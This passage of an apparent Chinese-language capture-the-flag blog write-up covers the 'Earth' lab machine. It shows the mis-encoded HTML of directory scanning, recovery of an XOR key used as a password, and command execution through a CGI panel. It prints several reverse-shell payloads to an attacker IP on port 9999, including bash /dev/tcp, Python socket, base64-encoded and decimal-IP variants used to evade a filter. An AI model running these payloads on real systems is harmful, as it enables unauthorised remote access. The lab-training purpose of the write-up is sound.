ä¸å¯ä»¥_ä¸åšåŸŸåè§£æç›´æ¥ç”¨å…¬ç½‘ ip è®¿é—®å¯å¦ - CSDN åšå®¢</a></p>\n<p>ä½†æ˜¯ â€”â€” è¿™é‡Œä¼¼ä¹æ˜¯ SSL è¯ä¹¦é—®é¢˜ï¼ˆç”¨ python è¯·æ±‚åŸŸååœ°å€å°±ä¼šæç¤ºè¯ä¹¦é—®é¢˜â€¦â€¦ï¼‰</p>\n<h1 id=\"xoråˆæ¢\"><a class=\"anchor\" href=\"#xoråˆæ¢\">#</a> XOR åˆæ¢</h1>\n<p>æŠ˜è…¾å®Œï¼Œè®¿é—®ä¸€ä¸‹ç»ˆäºæ­£å¸¸äº†ï¼š</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503134311209.png\" alt=\"image-20240503134311209\" /></p>\n<p>ä¸‹é¢æœ‰å¾ˆé•¿ä¸²çš„å­—ç¬¦è´´åœ¨è¿™é‡Œï¼Œåˆ’éƒ½åˆ’ä¸åˆ°å°½å¤´ã€‚ä¸€çœ¼æ‰«è¿‡å­—æ¯éƒ½æ˜¯åœ¨ a-fï¼Œæœ‰å¯èƒ½æ˜¯ 16 è¿›åˆ¶ï¼Œä½†æ˜¯è½¬ç å‡ºæ¥æ˜¯ä¹±ç ã€‚</p>\n<figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</pre></td></tr></table></figure><figure class=\"highlight text\"><figcaption data-lang=\"text\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</pre></td></tr></table></figure><figure class=\"highlight text\"><figcaption data-lang=\"text\"><span>é‡ç‚¹å…³æ³¨ï¼</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</pre></td></tr></table></figure><p>ç”¨ dirsearch æ‰«ç›®å½•å‘ç° admin è·¯ç”± 301ï¼Œä¼°è®¡è¢«é‡å®šå‘åˆ°éªŒè¯ç™»å½•ç•Œé¢äº†ã€‚</p>\n<p>è®© sqlmap åœ¨åå°è·‘ç€å…ˆï¼Œæ¢å¦ä¸€ä¸ªåŸŸåæ‰¾æ‰¾çº¿ç´¢ã€‚ <code>http://terratest.earth.local/</code></p>\n<p>æ‰“å¼€çš„ç•Œé¢æ˜¯ä¸€æ ·çš„ã€‚è¿˜æ˜¯æ‰«ä¸€æ‰«ç›®å½•çœ‹çœ‹ã€‚ç»“æœå’Œå‰é¢æ˜¯ä¸€æ ·çš„ï¼Œéš¾é“ä¸¤ä¸ªåŸŸåä¸‹æœåŠ¡éƒ½æ˜¯ä¸€æ ·çš„ï¼Ÿ</p>\n<p>ç„¶åæˆ‘åˆç”¨ nmap æ‰«äº†ä¸¤ä¸ªåŸŸåï¼Œä¸¤ä¸ªåŸŸåéƒ½å¼€æ”¾äº† 22ï¼Œ80ï¼Œ443 ç«¯å£ã€‚äºæ˜¯æˆ‘æ”¹æˆç”¨ https åè®®è®¿é—®äº†ä¸€ä¸‹ã€‚</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503184626790.png\" alt=\"image-20240503184626790\" /></p>\n<p>æµ‹è¯•ç«™ç‚¹è®©æˆ‘å¿½ç•¥ï¼Ÿæˆ‘ä¿¡ä½ ä¸ªé¬¼ä½ ä¸ªç³Ÿè€å¤´å­åå¾—å¾ˆã€‚æµ‹è¯•ç«™ç‚¹æ„Ÿè§‰æœ‰æºç æ³„éœ²çš„å¯èƒ½ã€‚å…ˆä¸Š dirsearchã€‚</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240503185241920.png\" alt=\"image-20240503185241920\" /></p>\n<p>æœç„¶æœ‰ç„æœºã€‚è™½ç„¶éƒ½æ˜¯ 403ï¼Œä½†æ˜¯ 200 çš„ robots.txt å¯ä»¥è®¿é—®åˆ°ã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>çœ‹çœ‹28ã€30è¡Œ</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>User-Agent: *</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Disallow: /*.asp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Disallow: /*.aspx</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Disallow: /*.bat</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Disallow: /*.c</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Disallow: /*.cfm</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Disallow: /*.cgi</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Disallow: /*.com</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Disallow: /*.dll</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Disallow: /*.exe</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Disallow: /*.htm</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Disallow: /*.html</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Disallow: /*.inc</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>Disallow: /*.jhtml</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Disallow: /*.jsa</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Disallow: /*.json</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Disallow: /*.jsp</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Disallow: /*.log</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Disallow: /*.mdb</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Disallow: /*.nsf</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Disallow: /*.php</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>Disallow: /*.phtml</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Disallow: /*.pl</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>Disallow: /*.reg</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Disallow: /*.sh</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>Disallow: /*.shtml</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Disallow: /*.sql</pre></td></tr><tr class=\"marked\"><td data-num=\"28\"></td><td><pre>Disallow: /*.txt</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>Disallow: /*.xml</pre></td></tr><tr class=\"marked\"><td data-num=\"30\"></td><td><pre>Disallow: /testingnotes.*</pre></td></tr></table></figure><p>å†…å®¹å¾ˆå¤šï¼Œæœ€åæœ‰ä¸€ä¸ªæ–‡ä»¶åï¼ŒæŒ¨ä¸ªè¯•ä¸€ä¸‹åç¼€ï¼Œå‘ç° txt ä¸­æœ‰å†…å®¹ğŸ‘‡</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504001554684.png\" alt=\"image-20240504001554684\" /></p>\n<p><mark>æ¶ˆæ¯é‡å·¨å¤§</mark>ï¼ŒXOR å…¶å®å°±æ˜¯å¼‚æˆ–è¿ç®—ï¼š<a href=\"https://blog.csdn.net/roc1010/article/details/103227081\">å¼‚æˆ– (XOR) è¿ç®—åŠ å¯† - CSDN åšå®¢</a></p>\n<blockquote>\n<p>æ˜æ–‡ XOR key ==&gt; å¯†æ–‡      å¯†æ–‡ XOR key ==&gt; æ˜æ–‡</p>\n</blockquote>\n<p>è®¿é—® testdata.txt å¾—åˆ°ä¸€ä¸²è‹±æ–‡ï¼Œå†™ä¸ªè„šæœ¬è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è¯•å‡ºæ¥ key æ˜¯ä»€ä¹ˆã€‚</p>\n<p>ç”¨ç¬¬ä¸‰ä¸² 16 è¿›åˆ¶å­—ç¬¦è¯•ä¸€ä¸‹ï¼ˆå› ä¸ºæ˜æ–‡å¾ˆé•¿ï¼Œå¯†æ–‡åº”è¯¥ä¹Ÿå¾ˆé•¿ï¼‰</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504134242912.png\" alt=\"image-20240504134242912\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># è„šæœ¬ï¼š</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">find_key</span><span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> ciphertext_hex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    ciphertext_bytes <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span>ciphertext_hex<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚ä¸²</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span> char_plain<span class=\"token punctuation\">,</span> char_cipher <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> ciphertext_bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        key_byte <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>char_plain<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> char_cipher  <span class=\"token comment\"># å¯¹åº”ä½ç½®çš„å­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®—</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        key<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>key_byte<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>plaintext <span class=\"token operator\">=</span> <span class=\"token string\">\"According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>ciphertext_hex <span class=\"token operator\">=</span> <span class=\"token string\">\"2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a\"</span>  <span class=\"token comment\"># è¿™é‡Œå¯†æ–‡æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>key <span class=\"token operator\">=</span> find_key<span class=\"token punctuation\">(</span>plaintext<span class=\"token punctuation\">,</span> ciphertext_hex<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># OUTPUTï¼š</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token string\">b'earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat'</span></pre></td></tr></table></figure><p><code>earthclimatechangebad4humans</code>  é‡å¤äº† 15 æ¬¡ã€‚ç”¨æ˜æ–‡å’Œå…¶ä»–ä¸¤ä¸²å¯†æ–‡å°è¯•äº†ä¸‹ï¼Œkey éƒ½æ˜¯å«æœ‰å­—ç¬¦æ‚ä¹±æ— ç« çš„ä¹±ç ï¼ˆæ²¡æœ‰ä¸å¯è§å­—ç¬¦ï¼‰ã€‚ç„¶åç”¨ <code>earthclimatechangebad4humans</code>  ä½œä¸ºå¯†é’¥å°è¯•è§£å¯†å¦å¤–ä¸¤ä¸²å¯†æ–‡ï¼Œå¾—åˆ°çš„ä¹Ÿè¿˜æ˜¯æ‚ä¹±çš„å­—ç¬¦ä¸²ï¼ˆå«æœ‰ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œçœ‹ä¸å‡ºæ¥æœ‰ä»€ä¹ˆç‰¹æ®Šæ„ä¹‰ã€‚</p>\n<h1 id=\"ç™½é€äº†ä¸€ä¸ªwebshell\"><a class=\"anchor\" href=\"#ç™½é€äº†ä¸€ä¸ªwebshell\">#</a> ç™½é€äº†ä¸€ä¸ª webshell</h1>\n<p>ä¸è¿‡æç¤ºä¸­ç»™äº†ç”¨æˆ·åï¼Œå°è¯•ç™»å½•ä¸€ä¸‹ã€‚ç”¨æˆ·åï¼š <code>terra </code> ï¼Œå¯†ç ï¼š <code>earthclimatechangebad4humans</code></p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504011702039.png\" alt=\"image-20240504011702039\" /></p>\n<p>è¿™é‡Œå¯ä»¥è¿è¡Œ CGI è„šæœ¬ï¼Œäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ CGI å…ˆã€‚</p>\n<blockquote>\n<p>CGI æ˜¯ä¸€ç§æ ‡å‡†çš„ã€å¹³å°æ— å…³çš„ã€åè®®æ— å…³çš„æ¥å£ï¼Œç”¨äºå°† Web æœåŠ¡å™¨ä¸ Web åº”ç”¨ç¨‹åºæˆ–è„šæœ¬è¿æ¥èµ·æ¥ã€‚CGI å…è®¸ Web æœåŠ¡å™¨è°ƒç”¨å¤–éƒ¨ç¨‹åºæ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¹¶å°†è¾“å‡ºè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p>\n</blockquote>\n<p>è¯´äººè¯ï¼šæœåŠ¡å™¨ä¸€ä¸ªè„šæœ¬ï¼Œè·å–æ•°æ®å¤„ç†åè¿”å›ç»“æœç»™æµè§ˆå™¨ã€‚</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>æ•°æ®ä»å“ªæ¥ï¼ŸENV ç¯å¢ƒå˜é‡ï¼Œæˆ–è€…æ ‡å‡†è¾“å…¥ï¼ˆSTDINï¼‰ï¼›</p>\n</li>\n<li class=\"lvl-2\">\n<p>è„šæœ¬ç”¨ä»€ä¹ˆè¯­è¨€ï¼Ÿå¯ä»¥æ˜¯ Python è„šæœ¬ï¼ŒPERL è„šæœ¬ï¼ŒSHELL è„šæœ¬ï¼ŒC æˆ–è€… C++ ç¨‹åºç­‰ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p>ç»“æœæ€ä¹ˆè¿”å›ï¼Ÿè¾“å‡ºæ•°æ®å‘é€åˆ°æ ‡å‡†è¾“å‡ºï¼ˆSTDOUTï¼‰ã€‚</p>\n</li>\n</ul>\n<p><mark><strong>ç‰¹åˆ«ä¹‹å¤„ï¼š</strong></mark></p>\n<ol>\n<li class=\"lvl-3\">\n<p>æ•°æ®è¾“å…¥</p>\n</li>\n</ol>\n<p>** ç¯å¢ƒå˜é‡è¯»å–ï¼š** å¯¹äº CGI ç¨‹åºæ¥è¯´ï¼Œå®ƒç»§æ‰¿äº†ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ã€‚CGI ç¯å¢ƒå˜é‡åœ¨ CGI ç¨‹åºå¯åŠ¨æ—¶åˆå§‹åŒ–ï¼Œåœ¨ç»“æŸæ—¶é”€æ¯ã€‚å½“ä¸€ä¸ª CGI ç¨‹åºä¸æ˜¯è¢« HTTP æœåŠ¡å™¨è°ƒç”¨æ—¶ï¼Œå®ƒçš„ç¯å¢ƒå˜é‡å‡ ä¹æ˜¯ç³»ç»Ÿç¯å¢ƒå˜é‡çš„å¤åˆ¶ã€‚å½“è¿™ä¸ª CGI ç¨‹åºè¢« HTTP æœåŠ¡å™¨è°ƒç”¨æ—¶ï¼Œå®ƒçš„ç¯å¢ƒå˜é‡å°±ä¼šå¤šäº†ä»¥ä¸‹å…³äº HTTP æœåŠ¡å™¨ã€å®¢æˆ·ç«¯ã€CGI ä¼ è¾“è¿‡ç¨‹ç­‰é¡¹ç›®ã€‚</p>\n<p>** æµè§ˆå™¨æ•°æ®å‘é€ï¼š** è·å–çš„æ˜¯æµè§ˆå™¨ url ç¼–ç åçš„åŸå§‹æ•°æ®ï¼Œè‹¥è¦ä½¿ç”¨åˆ™éœ€è¦ CGI æ‰‹åŠ¨è§£ç è°ƒç”¨ã€‚</p>\n<ol start=\"2\">\n<li class=\"lvl-3\">\n<p>æ•°æ®è¾“å‡º</p>\n</li>\n</ol>\n<p>CGI ç¨‹åºå¦‚ä½•å°†ä¿¡æ¯å¤„ç†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼Ÿè¿™å®é™…ä¸Šæ˜¯ CGI æ ¼å¼åŒ–è¾“å‡ºã€‚</p>\n<p>åœ¨ CGI ç¨‹åºä¸­çš„æ ‡å‡†è¾“å‡º stdout æ˜¯ç»è¿‡é‡å®šä¹‰äº†çš„ï¼Œå®ƒå¹¶æ²¡æœ‰åœ¨æœåŠ¡å™¨ä¸Šäº§ç”Ÿä»»ä½•çš„è¾“å‡ºå†…å®¹ï¼Œè€Œæ˜¯è¢«é‡å®šå‘åˆ°å®¢æˆ·æµè§ˆå™¨ï¼Œè¿™ä¸å®ƒæ˜¯ç”± Cï¼Œè¿˜æ˜¯ Perl æˆ– Python å®ç°æ— å…³ã€‚</p>\n<p>CGI åè®®è¿˜æœ‰ä¸€ç³»åˆ—è§„èŒƒï¼Œè¯¦è§£æˆ³ğŸ‘‰çŸ¥è¯†ä¼ é€é—¨ï¼š<a href=\"https://blog.csdn.net/weixin_39609623/article/details/86312439\">WEB ä¹‹ CGI----CGI è¯¦è§£_cgi web-CSDN åšå®¢</a></p>\n<p>çœ‹å®Œè¿™äº›åº”è¯¥éƒ½èƒ½å‘ç°è¿™æ˜¯<span class=\"spoiler\" title=\"ä½ çŸ¥é“å¾—å¤ªå¤šäº†\"> hacker çš„æœ€çˆ±</span>äº†ã€‚è¿™ä¸ªæ¡†æ¡†ç›´æ¥å¯ä»¥å‘½ä»¤æ‰§è¡Œã€‚</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504015919921.png\" alt=\"image-20240504015919921\" /></p>\n<p>ç›´æ¥å¼¹ä¸ª shell åˆ° kali ä¸Šï¼Œå‡†å¤‡åç»­çš„ææƒã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/192.168.81.129/9999 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span>    <span class=\"token comment\">#  CGI é¶æœºæ‰§è¡Œå¼¹ shell</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvvp</span> <span class=\"token number\">9999</span>                                   <span class=\"token comment\"># kali ç›‘å¬ç«¯å£</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240504020245279.png\" alt=\"image-20240504020245279\" /></p>\n<p>æˆ‘å˜ä¸ªè±†ï¼ŒForbidden äº†â€¦â€¦ï¼ˆå¿ƒç†æ€’å–·ä¸€ä¸‡å¥ä½†æ˜¯è¡¨é¢æ€‚å¾—ä¸€æ‰¹ï¼‰ã€‚ç›´æ¥å¼¹ä¸è¡Œç»•ä¸€ä¸‹ã€‚</p>\n<p>åå¼¹ shell payload å¤§å…¨ï¼š<a href=\"https://www.revshells.com/\">Online - Reverse Shell Generator (revshells.com)</a></p>\n<p>ç¡¬çš„ä¸è¡Œæ¥è½¯çš„ï¼Œç”¨è„šæœ¬å¼¹ã€‚å‰é¢å·²ç»çŸ¥é“äº†é¶æœºæœ‰ python ç¯å¢ƒçš„ã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python3 <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.81.129\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'</span></pre></td></tr></table></figure><p><span class=\"spoiler\" title=\"ä½ çŸ¥é“å¾—å¤ªå¤šäº†\">æ·¦</span>è¿™é‡Œè¿˜æœ‰ä¸ªé™åˆ¶ï¼Œå¦‚æœæ˜¯ç”¨ hackbar åœ¨ POST ä¸­è¾“å…¥ commandï¼Œç”±äºç½‘é¡µå­˜åœ¨ csrf çš„ token æ ¡éªŒï¼Œå¯¼è‡´ execute æ—¶ç›´æ¥å¼¹å‡º 403Forbiddenï¼Œè€Œç›´æ¥åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥å‘ç°æœ‰é•¿åº¦ 100 çš„é™åˆ¶ã€‚äºæ˜¯ä¹Ÿè¡Œä¸é€šã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> exec<span class=\"token punctuation\">(</span><span class=\"token string\">'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjgxLjEyOS85OTk5IDA+JjE='</span>.decode<span class=\"token punctuation\">(</span><span class=\"token string\">'base64'</span><span class=\"token punctuation\">))</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-c</span> <span class=\"token punctuation\">&#123;</span>echo,c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC44MS4xMjkvOTk5OSAwPiYx<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>base64,-d<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">|</span><span class=\"token punctuation\">&#123;</span>bash,-i<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ª payload éƒ½æ­£å¸¸æ‰§è¡Œäº†ä½†æ˜¯å´æ²¡æœ‰å¼¹ shell åˆ° kali ä¸Šï¼Œæˆ‘çŒœæµ‹è¿™é‡Œçš„ waf åªæ˜¯æ­£åˆ™åŒ¹é…äº† ip çš„æ ¼å¼ï¼Œè¯•ä¸€ä¸‹ç”¨è¿›åˆ¶ç»•è¿‡ï¼š</p>\n<p>3232256385 ---&gt; 192.168.81.129 çš„ 10 è¿›åˆ¶ã€‚<a href=\"https://www.metools.info/other/ipconvert162.html\">IP åœ°å€åå…­è¿›åˆ¶ã€äºŒè¿›åˆ¶ã€åè¿›åˆ¶è½¬æ¢åœ¨çº¿å·¥å…·</a></p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/3232256385/9999 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span></pre></td></tr></table></figure><p>å¼¹æ˜¯å¼¹åˆ°äº†ä½†æ˜¯â€¦â€¦<span class=\"spoiler\" title=\"ä½ çŸ¥é“å¾—å¤ªå¤šäº†\"> ä½œè€…æˆ‘æ˜Ÿæ˜Ÿä½ ä¸ª **ğŸ˜ </span></p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505130316045.png\" alt=\"image-20240505130316045\" /></p>\n<p>åº”è¯¥æ˜¯ sudo çš„é—®é¢˜ï¼Œæ²¡æœ‰ç®¡ç†å‘˜æƒé™æ²¡æœ‰å¡«å†™å¯†ç å¯¼è‡´ CGI è¿›ç¨‹è¢«å…³é—­ã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/3232256385/9999 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505135912477.png\" alt=\"image-20240505135912477\" /></p>\n<p>ä¸€èˆ¬åå¼¹çš„ webshell éƒ½æ˜¯è€å¼±ç—…æ®‹ï¼Œä¸æ”¯æŒä¸Šä¸‹æ–‡å¹¶ä¸”æ— æ³•è¿è¡Œäº¤äº’å¼å‘½ä»¤ã€‚å·²çŸ¥é¶æœºæœ‰ python ç¯å¢ƒï¼Œè¯•ä¸€è¯•èƒ½ä¸èƒ½æ‰“å¼€äº¤äº’å¼ shellï¼Œç„¶åå°è¯•ä¸‹ææƒã€‚</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'import pty; pty.spawn(\"/bin/bash\")'</span></pre></td></tr></table></figure><p>æ‰“å¼€åè¿˜æ˜¯è¿™ä¸ªç»ˆç«¯ï¼Œå¹¶ä¸”å¯ä»¥äº¤äº’ã€‚ä¸ºä»€ä¹ˆ webshell ç›´æ¥å°±æ˜¯äº¤äº’å¼ shellï¼Ÿå¤§æ¦‚å’Œ CGI çš„è¾“å…¥è¾“å‡ºæµæœ‰å…³ç³»å§ï¼ˆåªæ˜¯çŒœæµ‹ï¼‰ã€‚</p>\n<p><img loading=\"lazy\" data-src=\"/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505150248362.png\" alt=\"image-20240505150248362\" /></p>\n<p>æŸ¥çœ‹ <code>/etc/passwd</code> ï¼Œå½“å‰ç”¨æˆ·æ˜¯ apacheã€‚</p>\n<figure class=\"highlight 